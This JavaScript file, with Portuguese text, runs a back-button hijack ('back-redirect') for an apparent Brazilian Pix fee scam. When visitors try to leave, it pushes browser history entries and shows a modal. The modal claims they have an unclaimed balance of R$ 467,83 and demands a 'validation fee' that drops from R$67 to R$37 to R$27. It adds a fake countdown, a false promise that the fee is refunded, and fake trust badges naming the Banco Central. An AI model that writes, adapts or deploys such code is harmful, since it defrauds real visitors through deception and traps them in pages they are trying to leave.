/**
 * CashNoPix — Back-Redirect Engine
 * Modal centralizado (popup) com as 3 ofertas em cascata.
 * Ativado quando o usuário tenta sair da página.
 */
(function () {
  'use strict';

  if (window.CNP_BACKREDIRECT_LOADED) return;
  window.CNP_BACKREDIRECT_LOADED = true;

  /* =====================================================
     OFERTAS EM CASCATA
     1 → Preço cheio (R$67)
     2 → Downsell 1  (R$37)
     3 → Downsell 2  (R$27 — última chance)
     ===================================================== */
  const OFFERS = [
    {
      badge:  '⚠️ AGUARDE — NÃO FECHE!',
      title:  'Seu saque ainda está reservado!',
      desc:   'Sua conta está com <strong>R$ 467,83 prontos para saque</strong>. Mas você precisa validar agora — em minutos esse valor será liberado para outra pessoa.',
      price:  67.00,
      priceLabel: 'R$ 67,00',
      oldPrice: null,
      btnText: '💰 VALIDAR AGORA — R$ 67,00',
      btnColor: 'linear-gradient(135deg, #16a34a, #22c55e)',
      closeText: 'Não quero meu dinheiro',
    },
    {
      badge:  '🔥 DESCONTO EXCLUSIVO!',
      title:  'Espera! Reduzimos a taxa pela metade!',
      desc:   'Como você ainda não confirmou, estamos oferecendo um <strong>desconto especial de 45%</strong>. Pague apenas R$ 37,00 e receba todos os seus ganhos agora!',
      price:  37.00,
      priceLabel: 'R$ 37,00',
      oldPrice: 'R$ 67,00',
      btnText: '⚡ APROVEITAR DESCONTO — R$ 37,00',
      btnColor: 'linear-gradient(135deg, #d97706, #f59e0b)',
      closeText: 'Não, prefiro perder meu saque',
    },
    {
      badge:  '🚨 ÚLTIMA OPORTUNIDADE!',
      title:  'Taxa mínima: R$ 27,00 — Agora ou nunca!',
      desc:   'Essa é a nossa oferta final. <strong>Reduzimos ao máximo para você</strong>. Pague apenas R$ 27,00 e seu saldo de R$ 467,83 será liberado imediatamente.',
      price:  27.00,
      priceLabel: 'R$ 27,00',
      oldPrice: 'R$ 67,00',
      btnText: '🏆 GARANTIR POR R$ 27,00 — ÚLTIMA CHANCE',
      btnColor: 'linear-gradient(135deg, #dc2626, #ef4444)',
      closeText: 'Abrir mão do meu saldo de R$ 467,83',
    },
  ];

  let level = 0;
  let isOpen = false;
  let clockInterval = null;

  /* =====================================================
     INJECT CSS
     ===================================================== */
  const css = document.createElement('style');
  css.textContent = `
    #br-overlay {
      position: fixed !important;
      inset: 0 !important;
      z-index: 2147483646 !important;
      background: rgba(0,0,0,0.80) !important;
      display: flex !important;
      align-items: center !important;
      justify-content: center !important;
      padding: 16px !important;
      box-sizing: border-box !important;
      opacity: 0;
      pointer-events: none;
      visibility: hidden;
      transition: opacity 0.3s ease, visibility 0.3s ease;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif !important;
    }
    #br-overlay.br-open {
      opacity: 1 !important;
      pointer-events: auto !important;
      visibility: visible !important;
    }
    #br-box {
      background: #fff;
      border-radius: 20px;
      width: 100%;
      max-width: 420px;
      max-height: 92vh;
      overflow-y: auto;
      box-shadow: 0 24px 60px rgba(0,0,0,0.45);
      transform: scale(0.85) translateY(20px);
      transition: transform 0.4s cubic-bezier(0.34,1.56,0.64,1);
      -webkit-overflow-scrolling: touch;
    }
    #br-overlay.br-open #br-box {
      transform: scale(1) translateY(0);
    }

    /* Badge */
    #br-badge {
      background: #fef2f2;
      border-bottom: 2px solid #fecaca;
      padding: 11px 20px;
      text-align: center;
      font-size: 13px;
      font-weight: 800;
      color: #dc2626;
      letter-spacing: 0.3px;
      border-radius: 20px 20px 0 0;
    }

    /* Saldo box */
    #br-saldo {
      background: linear-gradient(135deg, #16a34a, #22c55e);
      margin: 0;
      padding: 18px 20px 16px;
      text-align: center;
    }
    #br-saldo-label {
      font-size: 10px;
      font-weight: 700;
      color: rgba(255,255,255,0.75);
      text-transform: uppercase;
      letter-spacing: 1.5px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
      margin-bottom: 4px;
    }
    #br-saldo-value {
      font-size: clamp(32px, 9vw, 44px);
      font-weight: 900;
      color: #fff;
      letter-spacing: -1.5px;
      line-height: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    #br-saldo-sub {
      font-size: 13px;
      color: rgba(255,255,255,0.8);
      margin-top: 4px;
    }

    /* Body */
    #br-body {
      padding: 18px 20px;
    }
    #br-title {
      font-size: 18px;
      font-weight: 900;
      color: #0f172a;
      text-align: center;
      margin-bottom: 8px;
      line-height: 1.3;
    }
    #br-desc {
      font-size: 14px;
      color: #475569;
      text-align: center;
      line-height: 1.65;
      margin-bottom: 16px;
    }
    #br-desc strong { color: #0f172a; }

    /* Price box */
    #br-price-box {
      background: #f8fafc;
      border: 1.5px solid #e2e8f0;
      border-radius: 14px;
      padding: 14px;
      text-align: center;
      margin-bottom: 16px;
    }
    #br-old-price {
      font-size: 13px;
      color: #94a3b8;
      text-decoration: line-through;
      margin-bottom: 2px;
    }
    #br-new-price {
      font-size: 32px;
      font-weight: 900;
      color: #16a34a;
      letter-spacing: -1px;
    }
    #br-price-note {
      font-size: 12px;
      color: #64748b;
      margin-top: 2px;
    }

    /* Timer */
    #br-timer-wrap {
      background: #fef2f2;
      border: 1.5px solid #fecaca;
      border-radius: 12px;
      padding: 10px 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-bottom: 16px;
    }
    #br-timer-lbl { font-size: 12px; font-weight: 700; color: #dc2626; }
    #br-clock     { font-size: 22px; font-weight: 900; color: #dc2626; }

    /* Buttons */
    #br-cta {
      display: block;
      width: 100%;
      border: none;
      border-radius: 14px;
      padding: 17px 20px;
      color: #fff;
      font-size: 15px;
      font-weight: 800;
      cursor: pointer;
      text-align: center;
      margin-bottom: 10px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.2);
      transition: transform 0.15s, filter 0.15s;
      font-family: inherit;
      line-height: 1.3;
      animation: brPulse 2.5s ease-in-out infinite;
    }
    @keyframes brPulse {
      0%,100% { box-shadow: 0 6px 20px rgba(0,0,0,0.2); }
      50%      { box-shadow: 0 6px 32px rgba(0,0,0,0.35), 0 0 0 8px rgba(22,163,74,0.1); }
    }
    #br-cta:active { transform: scale(0.97); }
    #br-close {
      display: block;
      width: 100%;
      background: none;
      border: 1px solid #e2e8f0;
      border-radius: 10px;
      padding: 12px;
      font-size: 13px;
      color: #94a3b8;
      cursor: pointer;
      font-family: inherit;
      transition: background 0.15s;
    }
    #br-close:hover { background: #f8fafc; }

    /* Security footer */
    #br-footer {
      text-align: center;
      font-size: 11px;
      color: #cbd5e1;
      padding: 10px 20px 16px;
      border-top: 1px solid #f1f5f9;
    }
  `;
  document.head.appendChild(css);

  /* =====================================================
     CREATE HTML
     ===================================================== */
  const overlay = document.createElement('div');
  overlay.id = 'br-overlay';
  overlay.innerHTML = `
    <div id="br-box">
      <div id="br-badge">⚠️ AGUARDE — NÃO FECHE!</div>

      <div id="br-saldo">
        <div id="br-saldo-label">✨ PARABÉNS! VOCÊ CONQUISTOU</div>
        <div id="br-saldo-value"><span>💰</span><span>R$ 467,83</span><span>💰</span></div>
        <div id="br-saldo-sub">Última etapa para receber seu dinheiro</div>
      </div>

      <div id="br-body">
        <div id="br-title">Seu saque ainda está reservado!</div>
        <p id="br-desc"></p>

        <div id="br-price-box">
          <div id="br-old-price" style="display:none"></div>
          <div id="br-new-price">R$ 67,00</div>
          <div id="br-price-note">Taxa única · Devolvida em 2h junto com seu saque</div>
        </div>

        <div id="br-timer-wrap">
          <span id="br-timer-lbl">⏱ Oferta expira em:</span>
          <span id="br-clock">05:00</span>
        </div>

        <button id="br-cta">💰 VALIDAR AGORA — R$ 67,00</button>
        <button id="br-close">Não quero meu dinheiro</button>
      </div>

      <div id="br-footer">
        🔒 SSL Seguro &nbsp;·&nbsp; 🏦 Banco Central &nbsp;·&nbsp; ⭐ 4,8/5
      </div>
    </div>
  `;
  document.body.appendChild(overlay);

  /* =====================================================
     RENDER OFFER
     ===================================================== */
  function renderOffer(o) {
    document.getElementById('br-badge').innerHTML    = o.badge;
    document.getElementById('br-title').textContent  = o.title;
    document.getElementById('br-desc').innerHTML     = o.desc;
    document.getElementById('br-new-price').textContent = o.priceLabel;
    document.getElementById('br-cta').textContent    = o.btnText;
    document.getElementById('br-cta').style.background = o.btnColor;

    const oldEl = document.getElementById('br-old-price');
    if (o.oldPrice) {
      oldEl.textContent  = 'De ' + o.oldPrice;
      oldEl.style.display = 'block';
    } else {
      oldEl.style.display = 'none';
    }

    document.getElementById('br-close').textContent = o.closeText;
    startClock();
  }

  /* =====================================================
     SHOW / HIDE
     ===================================================== */
  function showOffer() {
    if (level >= OFFERS.length) return;
    renderOffer(OFFERS[level]);
    overlay.classList.add('br-open');
    document.body.style.overflow = 'hidden';
    isOpen = true;
    history.pushState(null, '', location.href);
  }

  function closeOffer() {
    overlay.classList.remove('br-open');
    document.body.style.overflow = '';
    isOpen = false;
    if (clockInterval) clearInterval(clockInterval);
    level++;
  }

  /* =====================================================
     CLOCK
     ===================================================== */
  function startClock() {
    if (clockInterval) clearInterval(clockInterval);
    let t = 300;
    const el = document.getElementById('br-clock');
    function tick() {
      t--;
      if (t <= 0 || !isOpen) { clearInterval(clockInterval); return; }
      const m = Math.floor(t / 60);
      const s = t % 60;
      el.textContent = m + ':' + String(s).padStart(2, '0');
    }
    clockInterval = setInterval(tick, 1000);
  }

  /* =====================================================
     BUTTON ACTIONS
     ===================================================== */
  document.getElementById('br-cta').addEventListener('click', () => {
    const amount = OFFERS[level] ? OFFERS[level].price : 67;
    closeOffer();
    if (typeof window.abrirPix === 'function') {
      window.abrirPix(amount);
    } else {
      window.location.href = 'taxa.html';
    }
  });

  document.getElementById('br-close').addEventListener('click', closeOffer);

  overlay.addEventListener('click', e => {
    if (e.target === overlay) closeOffer();
  });

  /* =====================================================
     ARMAR O BACK-REDIRECT
     ===================================================== */
  function arm() {
    if (!history.state || history.state !== 'br-armed') {
      history.pushState('br-armed', '', location.href);
    }
    window.addEventListener('popstate', () => {
      if (!isOpen && level < OFFERS.length) {
        showOffer();
      }
    });
  }

  // Múltiplos gatilhos para garantir ativação em mobile
  if (document.readyState === 'complete') {
    arm();
  } else {
    window.addEventListener('load', arm);
  }

  // Fallback após 1.5s
  setTimeout(arm, 1500);

  // Expor para testes manuais
  window.BR_show = showOffer;

})();
